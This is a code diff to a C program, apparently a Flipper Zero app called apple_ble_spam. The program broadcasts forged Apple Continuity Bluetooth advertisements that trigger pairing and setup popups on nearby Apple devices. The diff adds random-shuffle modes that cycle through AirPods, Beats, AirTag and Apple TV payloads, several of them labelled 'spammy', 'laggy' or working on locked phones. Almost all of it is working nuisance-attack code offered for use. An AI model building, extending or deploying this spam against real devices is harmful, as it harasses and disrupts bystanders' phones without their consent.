@@ -9,6 +9,7 @@
 typedef struct {
     const char* title;
     const char* text;
+    bool random;
     ContinuityMsg msg;
 } Payload;
 
@@ -17,11 +18,30 @@ typedef struct {
 // Proximity Pair IDs from https://github.com/ECTO-1A/AppleJuice/
 // Custom adv logic and Airtag ID from https://techryptic.github.io/2023/09/01/Annoying-Apple-Fans/
 
-static const Payload
+static Payload
     payloads[] =
         {
+            [ContinuityTypeNearbyAction] =
+                {.title = "Random Action",
+                 .text = "Spam shuffle Nearby Actions",
+                 .random = true,
+                 .msg =
+                     {
+                         .type = ContinuityTypeNearbyAction,
+                         .data = {.nearby_action = {.type = 0x00}},
+                     }},
+            [ContinuityTypeProximityPair] =
+                {.title = "Random Pair",
+                 .text = "Spam shuffle Proximity Pairs",
+                 .random = true,
+                 .msg =
+                     {
+                         .type = ContinuityTypeProximityPair,
+                         .data = {.proximity_pair = {.prefix = 0x00, .model = 0x0000}},
+                     }},
             {.title = "AirPods Pro",
              .text = "Modal, spammy (auto close)",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeProximityPair,
@@ -29,6 +49,7 @@ static const Payload
                  }},
             {.title = "Beats Solo 3",
              .text = "Modal, spammy (stays open)",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeProximityPair,
@@ -36,6 +57,7 @@ static const Payload
                  }},
             {.title = "AirPods Max",
              .text = "Modal, laggy (stays open)",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeProximityPair,
@@ -43,6 +65,7 @@ static const Payload
                  }},
             {.title = "Beats Flex",
              .text = "Modal, laggy (stays open)",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeProximityPair,
@@ -50,6 +73,7 @@ static const Payload
                  }},
             {.title = "Airtag",
              .text = "Modal, unlocked",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeProximityPair,
@@ -57,6 +81,7 @@ static const Payload
                  }},
             {.title = "Hermes Airtag",
              .text = "",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeProximityPair,
@@ -64,6 +89,7 @@ static const Payload
                  }},
             {.title = "AppleTV AutoFill",
              .text = "Banner, unlocked, long range",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeNearbyAction,
@@ -71,6 +97,7 @@ static const Payload
                  }},
             {.title = "AppleTV Connecting...",
              .text = "Modal, unlocked, long range",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeNearbyAction,
@@ -78,6 +105,7 @@ static const Payload
                  }},
             {.title = "AppleTV Audio Sync",
              .text = "Banner, locked, long range",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeNearbyAction,
@@ -85,6 +113,7 @@ static const Payload
                  }},
             {.title = "AppleTV Color Balance",
              .text = "Banner, locked",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeNearbyAction,
@@ -92,6 +121,7 @@ static const Payload
                  }},
             {.title = "Setup New iPhone",
              .text = "Modal, locked",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeNearbyAction,
@@ -99,6 +129,7 @@ static const Payload
                  }},
             {.title = "Transfer Phone Number",
              .text = "Modal, locked",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeNearbyAction,
@@ -106,6 +137,7 @@ static const Payload
                  }},
             {.title = "Pair AppleTV",
              .text = "Modal, unlocked",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeNearbyAction,
@@ -113,6 +145,7 @@ static const Payload
                  }},
             {.title = "HomePod Setup",
              .text = "Modal, unlocked",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeNearbyAction,
@@ -120,6 +153,7 @@ static const Payload
                  }},
             {.title = "AirPods",
              .text = "Modal, spammy (auto close)",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeProximityPair,
@@ -127,6 +161,7 @@ static const Payload
                  }},
             {.title = "AirPods 2nd Gen",
              .text = "Modal, spammy (auto close)",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeProximityPair,
@@ -134,6 +169,7 @@ static const Payload
                  }},
             {.title = "AirPods 3rd Gen",
              .text = "Modal, spammy (auto close)",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeProximityPair,
@@ -141,6 +177,7 @@ static const Payload
                  }},
             {.title = "AirPods Pro 2nd Gen",
              .text = "Modal, spammy (auto close)",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeProximityPair,
@@ -148,6 +185,7 @@ static const Payload
                  }},
             {.title = "Powerbeats 3",
              .text = "Modal, spammy (stays open)",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeProximityPair,
@@ -155,6 +193,7 @@ static const Payload
                  }},
             {.title = "Powerbeats Pro",
              .text = "Modal, spammy (auto close)",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeProximityPair,
@@ -162,6 +201,7 @@ static const Payload
                  }},
             {.title = "Beats Solo Pro",
              .text = "",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeProximityPair,
@@ -169,6 +209,7 @@ static const Payload
                  }},
             {.title = "Beats Studio Buds",
              .text = "",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeProximityPair,
@@ -176,6 +217,7 @@ static const Payload
                  }},
             {.title = "Beats X",
              .text = "Modal, spammy (stays open)",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeProximityPair,
@@ -183,6 +225,7 @@ static const Payload
                  }},
             {.title = "Beats Studio 3",
              .text = "Modal, spammy (stays open)",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeProximityPair,
@@ -190,6 +233,7 @@ static const Payload
                  }},
             {.title = "Beats Studio Pro",
              .text = "Modal, spammy (stays open)",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeProximityPair,
@@ -197,6 +241,7 @@ static const Payload
                  }},
             {.title = "Beats Fit Pro",
              .text = "",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeProximityPair,
@@ -204,6 +249,7 @@ static const Payload
                  }},
             {.title = "Beats Studio Buds+",
              .text = "",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeProximityPair,
@@ -211,6 +257,7 @@ static const Payload
                  }},
             {.title = "Setup New AppleTV",
              .text = "Modal, unlocked",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeNearbyAction,
@@ -218,6 +265,7 @@ static const Payload
                  }},
             {.title = "HomeKit AppleTV Setup",
              .text = "Modal, unlocked",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeNearbyAction,
@@ -225,6 +273,7 @@ static const Payload
                  }},
             {.title = "Join This AppleTV?",
              .text = "Modal, unlocked",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeNearbyAction,
@@ -232,6 +281,7 @@ static const Payload
                  }},
             {.title = "AppleID for AppleTV?",
              .text = "Modal, unlocked",
+             .random = false,
              .msg =
                  {
                      .type = ContinuityTypeNearbyAction,
@@ -239,32 +289,47 @@ static const Payload
                  }},
 };
 
+struct {
+    size_t count;
+    ContinuityData** data;
+} randoms[ContinuityTypeCount] = {
+    [ContinuityTypeNearbyAction] = {0, NULL},
+    [ContinuityTypeProximityPair] = {0, NULL},
+};
+
 typedef struct {
     bool advertising;
     size_t delay;
     size_t size;
     uint8_t* packet;
-    const ContinuityMsg* msg;
+    Payload* payload;
     FuriThread* thread;
     size_t index;
 } State;
 
 static int32_t adv_thread(void* ctx) {
     State* state = ctx;
+    Payload* payload = state->payload;
+    ContinuityMsg* msg = &payload->msg;
+    ContinuityType type = msg->type;
     while(state->advertising) {
-        continuity_generate_packet(state->msg, state->packet);
+        if(payload->random) {
+            size_t random_i = rand() % randoms[type].count;
+            memcpy(&msg->data, randoms[type].data[random_i], sizeof(msg->data));
+        }
+        continuity_generate_packet(msg, state->packet);
         furi_hal_bt_set_custom_adv_data(state->packet, state->size);
         furi_thread_flags_wait(true, FuriFlagWaitAny, state->delay);
     }
     return 0;
 }
 
-static void toggle_adv(State* state, const Payload* payload) {
+static void toggle_adv(State* state, Payload* payload) {
     if(state->advertising) {
         state->advertising = false;
         furi_thread_flags_set(furi_thread_get_id(state->thread), true);
         furi_thread_join(state->thread);
-        state->msg = NULL;
+        state->payload = NULL;
         free(state->packet);
         state->packet = NULL;
         state->size = 0;
@@ -272,7 +337,7 @@ static void toggle_adv(State* state, const Payload* payload) {
     } else {
         state->size = continuity_get_packet_size(payload->msg.type);
         state->packet = malloc(state->size);
-        state->msg = &payload->msg;
+        state->payload = payload;
         state->advertising = true;
         furi_thread_start(state->thread);
     }
@@ -320,6 +385,19 @@ static void input_callback(InputEvent* input, void* ctx) {
 
 int32_t apple_ble_spam(void* p) {
     UNUSED(p);
+    for(size_t payload_i = ContinuityTypeCount; payload_i < COUNT_OF(payloads); payload_i++) {
+        randoms[payloads[payload_i].msg.type].count++;
+    }
+    for(size_t random_i = 0; random_i < ContinuityTypeCount; random_i++) {
+        randoms[random_i].data = malloc(sizeof(ContinuityData*) * randoms[random_i].count);
+        size_t data_i = 0;
+        for(size_t payload_i = ContinuityTypeCount; payload_i < COUNT_OF(payloads); payload_i++) {
+            if(payloads[payload_i].msg.type == random_i) {
+                randoms[random_i].data[data_i++] = &payloads[payload_i].msg.data;
+            }
+        }
+    }
+
     State* state = malloc(sizeof(State));
     state->delay = 500;
     state->thread = furi_thread_alloc();
@@ -339,7 +417,7 @@ int32_t apple_ble_spam(void* p) {
         InputEvent input;
         furi_check(furi_message_queue_get(input_queue, &input, FuriWaitForever) == FuriStatusOk);
 
-        const Payload* payload = &payloads[state->index];
+        Payload* payload = &payloads[state->index];
         switch(input.key) {
         case InputKeyOk:
             toggle_adv(state, payload);
@@ -386,5 +464,9 @@ int32_t apple_ble_spam(void* p) {
 
     furi_thread_free(state->thread);
     free(state);
+
+    for(size_t random_i = 0; random_i < ContinuityTypeCount; random_i++) {
+        free(randoms[random_i].data);
+    }
     return 0;
 }
